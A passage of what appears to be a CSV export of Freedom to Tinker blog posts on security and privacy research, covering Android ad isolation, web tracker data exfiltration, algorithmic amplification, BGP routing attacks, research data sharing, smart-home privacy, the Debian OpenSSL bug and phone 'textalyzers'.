11, based on Android 4.4, which supports some 65 different devices. The process for doing this installation is sufficiently intricate that most users won’t be able to do it themselves, and in most cases it will require “wiping” the phone and reinstalling apps. Furthermore, there are thousands of different devices running Android 4.3 or earlier that CyanogenMod isn’t supporting. Another tactic is to “root” your phone and install an advertising blocker. I use AdAway, a free and open-source tool which is most easily installed via the F-Droid app store. (Google removed it from the Play Store, presumably because money.) Not only does this make your phone more secure, it also speeds up the Internet in a huge way, since you’re not loading all of that advertising content. What should Google do? Detail from our 2012 AdSplit research. Advertising is the tail that wags the dog. It’s time for Android to have dedicated mechanisms to partition ad code from their host applications. At Rice, we built a system called AdSplit. A team at the University of Washington built another system called LayerCake. These systems demonstrate that it’s entirely possible for mobile advertising to be isolated from its hosting app in an analogous fashion to how web pages wall off their advertising within IFRAME tags. By building a wall between advertising and its host application, advertisements can be locked into a tighter box of restricted OS permissions and we wouldn’t have to worry as much about WebView’s security issues. Google could potentially build a mechanism like this into its Google Play Services and deploy it widely, including to older Android 4.3 devices. Most ad libraries are really just a thin shim of Android native code that does little more than fire up a WebView and load content from the Internet. There’s no reason that shim couldn’t be standardized and we could remove the need for native advertising library code altogether. Does that seem crazy? Apple is requiring all new apps submitted to have 64-bit native ARM code. Google could just as well make restrictions on new app submissions to follow the new rules, and they could eventually crack down on old apps (perhaps scanning for them in its app store and maybe even banning them after some grace period). Realistically, it would take Google several months to a year to develop a service like this, test it, and get it rolled out. In the meantime, Google and the big advertising firms need to work together. The advertising firms need to update their libraries and Google needs to push developers to roll out apps with the new libraries. There should also be a threat here, such as advertisers refusing to pay money to app developers who put their users at risk by using unprotected libraries. Otherwise, very little will change for users of older Android platforms."
"24","2020-07-14","2023-03-24","https://freedom-to-tinker.com/2020/07/14/can-the-exfiltration-of-personal-data-by-web-trackers-be-stopped/","by Günes Acar, Steven Englehardt, and Arvind Narayanan. In a series of posts on this blog in 2017/18, we revealed how web trackers exfiltrate personal information from web pages, browser password managers, form inputs, and the Facebook Login API. Our findings resulted in many fixes and privacy improvements to browsers, websites, third parties, and privacy protection tools. However, the root causes of these privacy failures remain unchanged, because they stem from the design of the web itself. In a paper at the 2020 Privacy Enhancing Technologies Symposium, we recap our findings and propose two potential paths forward. Root causes of failures In the two years since our research, no fundamental fixes have been implemented that will stop third parties from exfiltrating personal information. Thus, it remains possible that similar privacy vulnerabilities have been introduced even as the specific ones we identified have mostly been fixed. Here’s why. The web’s security model allows a website to either fully trust a third party (by including the third-party script in a first party context) or not at all (by isolating the third party resource in an iframe). Unfortunately, this model does not capture the range of trust relationships that we see on the web. Since many third parties cannot provide their services (such as analytics) if they are isolated, the first parties have no choice but to give them full privileges even though they do not trust them fully. The model also assumes transitivity of trust. But in reality, a user may trust a website and the website may trust a third party, but the user may not trust the third party. Another root cause is the economic reality of the web that drives publishers to unthinkingly adopt code from third parties. Here’s a representative quote from the marketing materials of FullStory, one of the third parties we found exfiltrating personal information: Set-up is a thing of beauty. To get started, place one small snippet of code on your site. That’s it. Forever. Seriously. A key reason for the popularity of these third parties is that the small publishers that rely on them lack the budget to hire technical experts internally to replicate their functionality. Unfortunately, while it’s possible to effortlessly embed a third party, auditing or even understanding the privacy implications requires time and expertise. This may also help explain the limited adoption of technical solutions such as Caja or ConScript that better capture the partial trust relationship between first and third parties. Unfortunately, such solutions require the publisher to reason carefully about the privileges and capabilities provided to each individual third party. Two potential paths forward In the absence of a fundamental fix, there are two potential approaches to minimize the risk of large-scale exploitation of these vulnerabilities. One approach is to regularly scan the web. After all, our work suggests that this kind of large-scale detection is possible and that vulnerabilities will be fixed when identified. The catch is that it’s not clear who will do the thankless, time-consuming, and technically complex work of running regular scans, detecting vulnerabilities and leaks, and informing thousands of affected parties. As researchers, our role is to develop the methods and tools to do so, but running them on a regular basis does not constitute publishable research. While we have undertaken significant efforts to maintain our scanning tool OpenWPM as a resource for the community and make scan data available, regular and comprehensive vulnerability detection requires far more resources than we can afford. In fact, in addition to researchers, many other groups have missions that are aligned with the goal of large-scale web privacy investigations: makers of privacy-focused browsers and mobile apps, blocklist maintainers, advocacy groups, and investigative journalists. Some examples of efforts that we’re aware of include Mozilla’s maintenance of OpenWPM since 2018, Brave’s research on tracking protection, and DuckDuckGo’s dataset about trackers. However, so far, these efforts fall short of addressing the full range of web privacy vulnerabilities, and data exfiltration in particular. Perhaps a coalition of these groups can create the necessary momentum. The second approach is legal, namely, regulation that incentivizes first parties to take responsibility for the privacy violations on their websites. This is in contrast to the reactive approach above which essentially shifts the cost of privacy to public-interest groups or other external entities. Indeed, our findings represent potential violations of existing laws, notably the GDPR in the EU and sectoral laws such as HIPAA (healthcare) and FERPA (education) in the United States. However, it is unclear whether the first parties or the third parties would be liable. According to several session replay companies, they are merely data processors and not joint controllers under the GDPR. In addition, since there are a large number of first parties exposing user data and each violation is relatively small in scope, regulators have not paid much attention to these types of privacy failures. In fact, they risk effectively normalizing such privacy violations due to the lack of enforcement. Thus, either stepped-up enforcement of existing laws or new laws that establish stricter rules could shift incentives, resulting in stronger preventive measures and regular vulnerability scanning by web developers themselves. Either approach will be an uphill battle. Regularly scanning the web requires a source of funding, whereas stronger regulation and enforcement will raise the cost of running websites and will face opposition from third-party service providers reliant on the current lax approach. But fighting uphill battles is nothing new for privacy advocates and researchers. Update: Here’s the video of Günes Acar’s talk about this research at PETS 2020."
"25","2022-11-03","2023-03-24","https://freedom-to-tinker.com/2022/11/03/an-introduction-to-my-project-algorithmic-amplification-and-society/","This article was originally published on the Knight Institute website at Columbia University. The distribution of online speech today is almost wholly algorithm-mediated. To talk about speech, then, we have to talk about algorithms. In computer science, the algorithms driving social media are called recommendation systems, and they are the secret sauce behind Facebook and YouTube, with TikTok more recently showing the power of an almost purely algorithm-driven platform. Relatively few technologists participate in the debates on the societal and legal implications of these algorithms. As a computer scientist, that makes me excited about the opportunity to help fill this gap by collaborating with the Knight First Amendment Institute at Columbia University as a visiting senior research scientist — I’m on sabbatical leave from Princeton this academic year. Over the course of the year, I’ll lead a major project at the Knight Institute focusing on algorithmic amplification. This is a new topic for me, but it is at the intersection of many that I’ve previously worked on. My broad area is the societal impact of AI (I’m wrapping up a book on machine learning and fairness, and writing one about AI’s limits). I’ve done technical work to understand the social implications of recommender systems. And finally, I’ve done extensive research on platform accountability, including privacy, misleading content, and ads. Much of my writing will be about algorithmic amplification: roughly, the fact that algorithms increase the reach of some speech and suppress others. The term amplification is caught up in a definitional thicket. It’s tempting to define amplification with respect to some imagined neutral, but there is no neutral, because today’s speech platforms couldn’t exist in a recognizable form without algorithms at their core. Having previously worked on privacy and fairness—two terms that notoriously resist a consensus definition—I don’t see this as a problem. There are many possible definitions of amplification, and the most suitable definition will vary depending on the exact question one wants to answer. It’s important to talk about amplification and to explore its variations. Much of the debate over online speech, particularly the problem of mis/disinformation, reduces the harms of social media platforms to a false binary—what should be taken down, what should be left up. However, the logic of engagement optimization rewards the production of content that may not be well-aligned with societal benefit, even if it’s not harmful enough to be taken down. This manifests differently in different areas. Instagram and TikTok have changed the nature of travel, with hordes of tourists in some cases trampling on historic or religious sites to make videos in the hopes of going viral. In science, facts or figures in papers can be selectively quoted out of context in service of a particular narrative. Speech platforms are complex systems whose behavior emerges from feedback loops involving platform design and user behavior. As such, our techniques for studying them are in their infancy, and are further scuttled by the limited researcher access that platforms provide. I hope to both advocate for more access and transparency, and to push back against oversimplified narratives that have sometimes emerged from the research literature. My output, in collaboration with the Knight Institute and others at Columbia, will take three forms: an essay series, a set of videos and interactives to illustrate technical concepts, and a major symposium in spring 2023. An announcement about the symposium is coming shortly."
"26","2018-04-11","2023-03-24","https://freedom-to-tinker.com/2018/04/11/routing-attacks-on-internet-services/","by Yixin Sun, Annie Edmundson, Henry Birge-Lee, Jennifer Rexford, and Prateek Mittal [In this post, we discuss a recent thread of research that highlights the insecurity of Internet services due to the underlying insecurity of Internet routing. We hope that this thread facilitates important dialog in the networking, security, and Internet policy communities to drive change and adoption of secure mechanisms for Internet routing] The underlying infrastructure of the Internet comprises physical connections between more than 60,000 entities known as Autonomous Systems (such as AT&T and Verizon). Internet routing protocols such as the Border Gateway Protocol (BGP) govern how our communications are routed over a series of autonomous systems to form an end-to-end communication channel between a sender and receiver. Unfortunately, Internet routing protocols were not designed with security in mind. The insecurity in the BGP protocol allows potential adversaries to manipulate how routing on the Internet occurs. For example, see this recent real-world example of BGP attacks against Mastercard, Visa, and Symantec. The insecurity of BGP is well known, and a number of protocols have been designed to secure Internet routing. However, we are a long ways away from large-scale deployment of secure Internet routing protocols. This status quo is unacceptable. Historically, routing attacks have been viewed primarily from the perspective of an attack on availability of Internet applications. For example, an adversary can hijack Internet traffic towards a victim application server and cause unavailability (see YouTube’s 2008 hijack). A secondary perspective is that of confidentiality of unencrypted Internet communications. For example, an adversary can manipulate Internet routing to position itself on the communication path between a client and the application server and record unencrypted traffic: http://dyn.com/blog/mitm-internet-hijacking/ In this post, we argue that conventional wisdom significantly underestimates the vulnerabilities introduced due to insecurity of Internet routing. In particular, we discuss recent research results that exploit BGP insecurity to attack the Tor network, TLS encryption, and the Bitcoin network. BGP attacks on anonymity systems/Tor: The Tor network is a deployed system for anonymous communication that aims to protect user identity (IP address) in online communications. The Tor network comprises of over 7,000 relays which together carry terabytes of traffic every day. Tor serves millions of users, including political dissidents, whistle-blowers, law-enforcement, intelligence agencies, journalists, businesses and ordinary citizens concerned about the privacy of their online communications. Tor clients redirect their communications via a series of proxies for anonymous communication. Layered encryption is used such that each proxy only observes the identity of the previous hop and the next hop in the communication, and no single proxy observes the identities of both the client and the destination. However, if an adversary can observe the traffic from the client to the Tor network, and from the Tor network to the destination, then it can leverage correlation between packet timing and sizes to infer the network identities of clients and servers (end-to-end timing analysis). Therefore, an adversary can first use BGP attacks to hijack or intercept Internet traffic towards the Tor network (Tor relays), and perform traffic analysis of encrypted communications to compromise user anonymity. It is important to note that this timing analysis works even if the communication is encrypted. This illustrates an important point — the insecurity of Internet routing has important consequences for traffic-analysis attacks, which allow adversaries to infer sensitive information from communication meta-data (such as source IP, destination IP, packet size and packet timing), even if communication is encrypted. We introduced the threat of “Routing Attacks on Privacy in Tor” (RAPTOR attacks) at USENIX Security in 2015. We demonstrated the feasibility of RAPTOR attacks on the Tor network by performing real-world Internet routing manipulation in a controlled and ethical manner. Interested readers can see the technical paper and our project webpage for more details. Routing attacks challenge conventional beliefs about security of anonymity systems, and also have broad applicability to low-latency anonymous communication (including systems beyond Tor, such as I2P). Our work also motivates the design of anonymity systems that successfully resist the threat of Internet routing manipulation. The Tor project is already implementing design changes (such as Tor proposal 247 and Tor proposal 271) that make it harder for an adversary to infer and manipulate the client’s entry point (proxy) into the Tor network. Our follow-up work on Counter-RAPTOR defenses (presented at the IEEE Security and Privacy Symposium in 2017) presents a monitoring framework to analyze routing updates for the Tor network, which is being integrated into the Tor metrics portal. BGP attacks on TLS/Digital Certificates: The Transport Layer Security (TLS) protocol allows a client to establish a secure communication channel with a destination website using cryptographic key exchange protocols. To prevent man-in-the-middle attacks, clients using the TLS protocols need to authenticate the public key corresponding to the destination site, such as a web-server. Digital certificates issued by trusted Certificate Authorities (such as Let’s Encrypt) provide an authentic binding between destination server and its public key, allowing a client to validate the destination server. Given the widespread use of TLS for secure Internet communications, the security of the digital certificate ecosystem is paramount. We have shown that the process for obtaining digital certificates from trusted certificate authorities (called domain validation) is vulnerable to attack. A domain owner can perform a Certificate Signing Request (CSR) to a trusted Certificate Authority to obtain a digital certificate. The Certificate Authority must verify that the party submitting the request actually has control over the domains that are covered by that CSR. This process is known as domain control verification and is a core part of the Public Key Infrastructure (PKI) used in the TLS protocol. In our ongoing work in progress, presented at the HotPETS workshop in 2017, we demonstrated the feasibility of exploiting BGP attacks to compromise the domain validation protocol. For example, HTTP domain verification is a common method of domain control verification that requires the domain owner to upload a string specified by the CA to a specific HTTP URL at the domain. The CA can then verify the domain via a HTTP GET request. However, an adversary can manipulate inter-domain routing via BGP attacks to intercept all traffic towards the victim web-server, and successfully obtain a fraudulent digital certificate by spoofing a HTTP response corresponding to the CA challenge message. We have performed real-world Internet routing manipulation in a controlled and ethical manner to demonstrate the feasibility of these attacks. See our attack demonstration video for a demo. This attack has significant consequences for privacy of our online communications, as adversaries can bypass cryptographic protection offered by encryption using fraudulently obtained digital certificates. Our work is leading to deployment of suggested countermeasures (verification from multiple vantage points) at Let’s Encrypt. Please see the Let’s Encrypt deployment for more details. So far, we have discussed our research results from Princeton University. Below, I’ll briefly discuss research from Laurent Vanbever’s group at ETHZ and Sharon Goldberg’s Group at Boston University that have shown that it is possible to use inter-domain routing manipulation for attacking Bitcoin and for bypassing legal protections. BGP attacks on Crypto-currencies/Bitcoin: BGP manipulation can be used to perform two main types of attacks on crypto-currencies such as Bitcoin: (1) partitioning attacks, in which an adversary aims to disconnect a set of victim Bitcoin nodes from the network, or (2) delaying attacks, in which an adversary can slow down the propagation of data towards victim Bitcoin nodes. Both of these attacks result in potential economic loss to Bitcoin nodes. BGP attacks for bypassing legal protections: Domestic communications between US citizens have legal protections against surveillance. However, adversaries can manipulate inter-domain routing such that the actual communication path involves a foreign country, which could invalidate the legal protections and allow large-scale surveillance of online communications. Concluding Thoughts: The emergence of routing attacks on anonymity systems, Internet domain validation, and cryptocurrencies showcases that conventional wisdom has significantly underestimated the attack surface introduced due to the insecurity of Internet routing. It is imperative for critical Internet applications to be aware of the insecurity of Internet routing, and analyze the resulting security threats. Given the vulnerabilities in Internet routing, applications should consider domain specific defense mechanisms for enhancing user security and privacy. Examples include our Counter-RAPTOR analytics for Tor and Multiple vantage point defense for domain validation). We hope that our work, and the research discussed above is an enabler for this vision. While it is important to design and deploy application-specific defenses for protecting our systems against routing attacks that exploit current insecure Internet infrastructure, it is even more important to rethink the status quo of insecure routing protocols. Our ultimate goal ought to be to fundamentally eliminate the insecurity in today’s Internet routing protocols by moving towards the adoption of secure countermeasures. How do we drive this change?"
"27","2018-04-10","2023-03-24","https://freedom-to-tinker.com/2018/04/10/is-it-time-for-an-data-sharing-clearinghouse-for-internet-researchers/","Today’s Senate hearing with Facebook’s Mark Zuckerberg will start a long discussion on data collection and privacy from Internet companies. Although the spotlight is currently on Facebook, we shouldn’t forget that the picture is broader: companies from device manufacturers to ISPs collect network traffic and use it for a variety of purposes. The uses that we will hear about today are largely about the widespread collection of data about Internet users for targeted content delivery and advertising. Meanwhile, yesterday Facebook announced an initiative to share data with independent researchers to study social media’s impact on elections. At the same time Facebook is being raked over the coals for sharing their data with “researchers” (Cambridge Analytica), they’ve announced a program to share their data with (presumably more “legitimate”) researchers. Internet researchers depend on data. Sometimes, we can gather the data ourselves, using measurement tools deployed at the edge of the Internet (e.g., in home networks, on phones). In other cases, we need data from the companies that operate parts of the Internet, such as an Internet service provider (ISP), an Internet registrar, or an application provider (e.g., Facebook). If incentives align, data flows to the researcher. Interacting with a company can work very well when goals are aligned. I’ve worked well with companies to develop new spam filtering algorithms, to develop new botnet detection algorithms, and to highlight empirical results that have informed policy debates. If incentives do not align, then the researcher probably won’t get the data. When research is purely technical, incentives often align. When the technical work crosses over into policy (as it does in areas like net neutrality, and as we are seeing with Facebook), there can be (insurmountable) hurdles to data access. How an Internet Researcher Gets Data Today How do Internet researchers get data from companies today? An Internet operator I know aptly characterizes the status quo: “Show Internet operators you can do something useful, and they’ll give you data.” Researchers get access to Internet data from companies in two ways: (1) working for the company (as an employee), or (2) working with the company (as an “independent” researcher). Option #1: Work for a Company. Working for a company offers privileged access to data, which can be used to mint impressive papers (irreproducibility aside) simply because nobody else has the same data. I have taken this approach myself on a number of occasions, having worked for an ISP (AT&T), a DNS company (Verisign), and an Internet security service provider (Damballa). How this approach works. In the 2000s, research labs at AT&T and Sprint had privileged access to data, which gave rise to a proliferation of papers on “Everything You Wanted to Know About the Internet Backbone But Were Afraid to Ask”. Today, the story repeats itself, except that the players are Google and Facebook, and the topic du jour is data-center networks. Shortcomings of This Approach. Much research—from projects with a longer arc to certain policy-oriented questions—would never come to light if we only relied on company employees to do it. By the nature of their work, however, company employees lack independence. They lack both autonomy of selecting problems and in the ability to take positions or publish results that run counter to the company’s goals or priorities. This shortcoming may not matter if what the researcher wants to work on and what the company want to accomplish are the same. For many technical problems, this is the case (although there is still the tendency for the technical community to develop tunnel vision around areas where there is an abundance of data, while neglecting other areas). But for many problems—ranging from problems with a longer arc to deployment to those that may run counter to priorities—we can’t rely on industry to do the work. #2: Work with a Company. How this approach works. A researcher may instead work with a company, typically gaining privileged access to data for a particular project. Sometimes, we demonstrate the promise of a technique with some data that we can gather or bootstrap without any help and use that initial study to pique the interest of a company who may then share data with us to further develop the idea. Shortcomings of this approach. Research done in collaboration with a company often has similar shortcomings as the research that is done within a company’s walls. If the results of the research align with the company’s perspectives and viewpoints, then data sharing is copacetic. Even these cooperative settings do pose some risks to researchers, who may create the perception that they are not independent, merely by their association with the company. With purely technical research risks are lower, though still non-zero: for example, because the work depends on privileged data access, the researcher may still face challenges in presenting the research in a way that could help others reproduce it in the future. With technical work that can inform or speak to policy questions, there are some concerns. First, certain types of research or results may never come to light—if a company doesn’t like the result that may result from the data analysis, then they may simply not share the data, or they may ask for “pre-publication review” for results based on that data (this practice is common for research that is conducted within companies as well). There is also a second, more subtle concern. Even when the work is technically watertight, a researcher can still face questions—fair or unfair—about the soundness of the work due to the perceived motivations or agendas of cooperative parties involved. Current Data Sharing Approaches are Good, But They are Not Sufficient The above methods for data sharing can work well for certain types of research. In my career, I have made hay playing by these rules—often working with a company, first by demonstrating the viability of an idea with a smaller dataset that we gather ourselves and “pitching” the idea to a company. Yet, in my experience these approaches have two shortcomings. The first relates to incentives. The second relates to privacy. Problem #1: Incentives. Certain types of work depend on access to Internet data, but the company who holds the data may not have a direct incentive to facilitate the research. Possible studies of Facebook’s effect on elections certainly fall into this category: They simply may not like the results of the research. But, there are plenty of other lines of research that fall into the category where incentives may not align. Other examples range from measurements of Internet capacity and performance as they relate to broadband regulation (e.g., net neutrality) to evaluation of an online platform’s content moderation algorithms and techniques. Lots of other work relating to consumer protection falls into this category as well. We have to rely on users and researchers measuring things at the edge of the network to figure out what’s going on; from this vantage point, certain activities may naturally slip under the radar more easily. The current Internet data sharing roadmap doesn’t paint a rosy picture for research where incentives don’t align. Even when incentives do align, there can be perceptions of “capture”—effectively shilling an intellectual or technical finding in exchange for data access. It is in the interests of everyone—the academics and their industry partners alike—to establish more formal modes of data exchange when either (1) there is determination that the problem is important to study for the health of the Internet, or for the benefit of consumers; (2) there is the potential that the research will be perceived as not objective due to the nature of the data sharing agreement. Problem #2: Privacy. Sharing Internet data with researchers can introduce substantial privacy risks, and the need to share data with any researcher who works with a company should be evaluated carefully—ideally by an independent third party. When helping develop the researcher exception to the FCC’s broadband privacy rules, I submitted a comment that proposed the following criteria for sharing ISP data with researchers: Purpose of research. The data satisfies research that aims to promote security, stability, and reliability of networks. The research should have clear benefits for Internet innovation, operations, or security. Research goals do not violate privacy. The goals of the research does not include compromising consumer privacy; Privacy risks of data sharing are offset by benefits of the research. The risks of the data exchange are offset by the benefits of the research; Privacy risks of the data sharing are mitigated. Researchers should strive to use de-identified data wherever possible. The data adds value to the research. The research is enhanced by access to the data. Yet, outlining the criteria is one thing. The thornier question (which we did not address!) is: Who gets to decide the answers? Universities have institutional review boards that can help evaluate the merits of such a data sharing agreement. But, Cambridge Analytica might have the veneer of “research”, and a company may have no internal incentive to independently evaluate the data sharing agreement on its merits. In light of recent events, we may be headed towards the conclusion that such data-sharing agreements should always be vetted by independent third-party review. If the research doesn’t involve a university, however, the natural question is: Who is that third party? Looking Ahead: Data Clearinghouses for Internet Data? Certain types of Internet research—particularly those that involve thorny regulatory or policy questions—could benefit from an independent clearing house, where researchers could propose studies and experiments for independent evaluation and have them evaluated and selected by an independent third party, based on their benefits and risks. Facebook is exploring this avenue in the limited setting of election integrity. This is an exciting step. Moving forward, it will be interesting to see how Facebook’s meta-experiment on data sharing plays out, and whether it—or some variant—can serve as a model for Internet data sharing for other types of work writ large. In purely technical areas, such a clearinghouse could allow a broader range of researchers to explore, evaluate, reproduce and extend the types of work that for now remains largely irreproducible because data is under lock and key. For these questions, there could be significant benefit to the scientific community. In areas where the technical work or data analysis informs policy questions, the benefits to consumers could be even greater."
"28","2018-10-22","2023-03-24","https://freedom-to-tinker.com/2018/10/22/user-perceptions-of-smart-home-internet-of-things-iot-privacy/","by Noah Apthorpe This post summarizes a research paper, authored by Serena Zheng, Noah Apthorpe, Marshini Chetty, and Nick Feamster from Princeton University, which is available here. The paper will be presented at the ACM Conference on Computer-Supported Cooperative Work and Social Computing (CSCW) on November 6, 2018. Smart home Internet of Things (IoT) devices have a growing presence in consumer households. Learning thermostats, energy tracking switches, video doorbells, smart baby monitors, and app- and voice-controlled lights, speakers, and other devices are all increasingly available and affordable. Many of these smart home devices continuously monitor user activity, raising privacy concerns that may pose a barrier to adoption. In this study, we conducted 11 interviews of early adopters of smart home technology in the United States, investigating their reasons for purchasing smart-home IoT devices, perceptions of smart home privacy risks, and actions taken to protect their privacy from entities external to the home who create, manage, track, or regulate IoT devices and their data. We recruited participants by posting flyers in the local area, emailing listservs, and asking through word of mouth. Our recruiting resulted in six female and five male interviewees, ranging from 23–45 years old. The majority of participants were from the Seattle metropolitan area, but included others from New Jersey, Colorado, and Texas. The participants came from a variety of living arrangements, including families, couples, and roommates. All participants were fairly affluent, technically skilled, and highly interested in new technology, fitting the profile of “early adopters.” Each interview began with a tour of the participant’s smart home, followed by a semi-structured conversation with specific questions from an interview guide and open-ended follow-up discussions on topics of interest to each participant. The participants owned a wide variety of smart home devices and shared a broad range of experiences about how these devices have impacted their lives. They also expressed a range of privacy concerns, including intentional purchasing and device interaction decisions made based on privacy considerations. We performed open coding on transcripts of the interviews and identified four common themes: Convenience and connectedness are priorities for smart home device users. These values dictate privacy opinions and behaviors. Most participants cited the ability to stay connected to their homes, families, or pets as primary reasons for purchasing and using smart home devices. Values of convenience and connectedness outweighed other concerns, including obsolescence, security, and privacy. For example, one participant commented, “I would be willing to give up a bit of privacy to create a seamless experience, because it makes life easier.” User opinions about who should have access to their smart home data depend on perceived benefit from entities external to the home, such as device manufacturers, advertisers, Internet service providers, and the government. For example, participants felt more comfortable sharing their smart home data with advertisers if they believed that they would receive improved targeted advertising experiences. User assumptions about privacy protections are contingent on their trust of IoT device manufacturers. Participants tended to trust large technology companies, such as Google and Amazon, to have the technical means to protect their data, although they could not confirm if these companies actually performed encryption or anonymization. Participants also trusted home appliance and electronics brands, such as Philips and Belkin, although these companies have limited experience making Internet-connected appliances. Participants generally rationalized their reluctance to take extra steps to protect their privacy by referring to their trust in IoT device manufacturers to not do anything malicious with their data. Users are less concerned about privacy risks from devices that do not record audio or video. However, researchers have demonstrated that metadata from non-A/V smart home devices, such as lightbulbs and thermostats, can provide enough information to infer user activities, such as home occupancy, work routines, and sleeping patterns. Additional outreach is needed to inform consumers about non-A/V privacy risks. Recommendations. These themes motivate recommendations for smart home device designers, researchers, regulators, and industry standards bodies. Participants’ desires for convenience and trust in IoT device manufacturers limit their willingness to take action to verify or enforce smart home data privacy. This means that privacy notifications and settings must be exceptionally clear and convenient, especially for smart home devices without screens. Improved cybersecurity and privacy regulation, combined with industry standards outlining best privacy practices, would also reduce the burden on users to manage their own privacy. We encourage follow-up studies examining the effects of smart home devices on privacy between individuals within a household and comparing perceptions of smart home privacy in different countries. For more details about our interview findings and corresponding recommendations, please read our paper or see our presentation at CSCW 2018. Full citation: Serena Zheng, Noah Apthorpe, Marshini Chetty, and Nick Feamster. 2018. User Perceptions of Smart Home IoT Privacy. In Proceedings of the ACM on Human-Computer Interaction, Vol. 2, CSCW, Article 200 (November 2018), 20 pages. https://doi.org/10.1145/3274469"
"29","2013-09-20","2023-03-24","https://freedom-to-tinker.com/2013/09/20/software-transparency-debian-openssl-bug/","On Monday, Ed wrote about Software Transparency, the idea that software is more resistant to intentional backdoors (and unintentional security vulnerabilities) if the process used to create it is transparent. Elements of software transparency include the availability of source code and the ability to read or contribute to a project’s issue tracker or internal developer discussion. He mentioned a case that I want to discuss in detail: in 2008, the Debian Project (a popular Linux distribution used for many web servers) announced that the pseudorandom number generator in Debian’s version of OpenSSL was broken and insecure. First, some background: A pseudorandom number generator (PRNG) is a program F that, given a short random seed s, gives you a long stream of bits F(s) which appear to be random. If you and I put in the same seed s, we’ll get the same stream of bits. But if I choose s at random and don’t tell you what it is, you can’t predict F(s) at all—as far as you’re concerned, F(s) might as well be random. The OpenSSL PRNG tries to grab some unpredictable information (“entropy”) from the system, such as the current process ID, the contents of some memory that are likely to be different (for example, uninitialized memory which is or might be controlled by other processes) and so on, and turns these into the seed s. Then it gives back the random stream F(s). In 2006, in order to fix warnings spit out by a tool that can help find memory access bugs in software, one of the Debian maintainers decided to comment out two lines of code in the OpenSSL PRNG. It turns out that these lines were important: they were responsible for grabbing almost all of the unpredictable entropy that became the seed for the OpenSSL PRNG. Without them, the PRNG only had 32,767 choices for s, so there were only that many possible choices for F(s). And so programs that relied on the OpenSSL random number generator weren’t seeing nearly as much randomness as they thought they were. One such program generates the cryptographic keys used for SSL (secure web browsing) and SSH (secure remote login). Critically, these keys have to be random: if you can guess what my secret key is, you can break into anything I protect using that key. That means you have the ability to read encrypted traffic, log into remote servers, or to make forged messages appear authentic. Because the vulnerability had first been introduced in late 2006, the bug also made its way into Ubuntu (another popular Linux distribution widely used for web servers). All told, the bug affected thousands of servers and persisted for a long time because patching the affected servers was not enough to fix the problem—you also had to replace any predictable weak keys you had made while the vulnerability was present. As an aside, the problem of finding entropy to feed pseudorandom number generators is famously hard. Indeed, it’s still a big challenge to get right even today. Errors in randomness are hard to detect, because if you just eyeball the output, it will look random-ish and will change each time you run the program. Weak randomness can be very hard to spot, but it can render the cryptography in a (seemingly) secure system useless. Still, the Debian bug was obvious enough that it inspired a lot of ridicule in the security community once it was discovered. So was this problem a backdoor, purposefully introduced? It seems unlikely. The maintainer who made the change, Kurt Roeckx, was later made Secretary of the Debian Project, suggesting that he’s a real and trustworthy person and probably not a fake identity made up by the NSA to insert a vulnerability. The Debian Project is famous for requiring significant effort to reach the inner circle. And in this case, the mistake itself was not completely damning—a cascade of failures made the vulnerability possible and contributed to its severity. But the vulnerability did happen in a transparent setting. Everything that was done was done in public. And yet the vulnerability still got introduced and wasn’t noticed for a long time. That’s in part because all the transparency made for a lot of noise, so the people to whom the vulnerability would have been obvious weren’t paying attention. But it’s also because the vulnerability was subtle and the system wasn’t designed to make the impact of the change obvious to a casual observer. Does that mean that software transparency doesn’t help? I don’t think so—lots of people agree that transparent software is more secure than non-transparent software. But that doesn’t mean failures can’t still happen or that we should be less vigilant just because lots of other people can see what’s going on. At the very least, transparency lets us look back, years later, and figure out what caused the bug—in this case, engineering error and not deliberate sabotage."
"30","2016-04-15","2023-03-24","https://freedom-to-tinker.com/2016/04/15/on-distracted-driving-and-required-phone-searches/","A recent Arstechnica article discussed several U.S. states that are considering adding a “roadside textalyzer” that operates analogously to roadside Breathalyzer tests. In the same way that alcohol and drugs can impair a driver’s ability to navigate the road, so can paying attention to your phone rather than the world beyond. Many states “require” drivers to consent to Breathalyzer tests, where that “requirement” boils down to serious penalties if the driver declines. Vendors like Cellebrite are pushing for analogous requirements, for which they just happen to sell products. How exactly might a technology like this work? We don’t have any specifics, but we can look at Cellebrite’s other products and training services to get a sense of it. For example, Cellebrite offers “content transfer services”, and they have a three-day training course that goes into detail on how to analyze a SQLite database and how to work around passcodes and passwords. This sort of forensic investigative technology is entirely appropriate when a judge has issued a warrant, meaning that there’s probable cause and a particular description of the place to be searched. Translating the language of the Fourth Amendment to a smartphone, each app should hopefully constitute its own “place” for which there needs to be probable cause. But what about a roadside traffic stop, or the aftermath of an automobile accident? Does the investigating officer have probable cause and a particular app to search? Our legislators are dancing around this issue by assuming Cellebrite and their competitors can create a magic wand that somehow indicates “yes, texting happened here in the past N minutes” or “no texting happened here”. That magic wand would then generate the probable cause for a more invasive search, in the same way that a drunk driver’s slurred speech or breath smelling of alcohol can create probable cause for further investigation. In the real world, we would expect an unacceptably high error rate with any sort of “textalyzer” magic wand. Consider, for example, a magic wand that doesn’t look into the phone at all, but instead measures the recency of SMS and MMS texts using information from the cellular carriers. A cellular carrier can certainly confirm that there was an inbound text, but it has no idea if it was read visually on the smartphone screen, if the car pronounced it out loud through the stereo system, or if it was quietly stored in the phone, unread by the driver. Similar, a cellular carrier can’t know whether a response text came from a hands-free voice recognition feature or via the smartphone keyboard. Furthermore, a carrier-based magic wand would be completely unable to measure texting apps that use Internet-backed services (e.g., Facebook Messenger, Apple iMessage, Google Hangout, Twitter, Whatsapp, YikYak). Those communicates are, or should be, encrypted, making it difficult to distinguish background app traffic, going on all the time, from the foreground actions of a user. Building a better magic wand would require extracting the various apps’ databases, and that in turn would require an increasingly invasive tool. These databases aren’t necessarily readable through external USB protocols like MTP or PTP (media transfer protocol, picture transfer protocol). Apps can keep their databases in private storage, and may well encrypt them. If you want a foolproof magic wand, then you’re going to need mandated backdoors, as we’ve discussed in the FBI vs. Apple case, with all the attendant downsides that go along with such technologies. Food for thought: one way that Cellebrite’s tooling might be able to work around these issues is to use root-level exploits, wherein they would sideload their own app, become root, then extract the data they want. This means that phones with up-to-date security patches might well defeat Cellebrite’s magic wand. What happens at a traffic stop if the magic wand responds, “sorry, I’m not able to see inside this phone”? What happens when somebody engineers a smartphone app that specifically knows how to lie to Cellebrite’s magic wand or destroy the evidence that it looks for? Technological alternatives Given that distracted driving is a serious concern, we need to propose a serious alternative to these sorts of “magic wand” technologies, given their inherent inaccuracy, unacceptable invasiveness, and at-best questionable constitutionality. The best solution is the one that’s already happening: Apple CarPlay and Android Auto. You plug your phone into your car, and your phone gets to hijack the car’s stereo system and 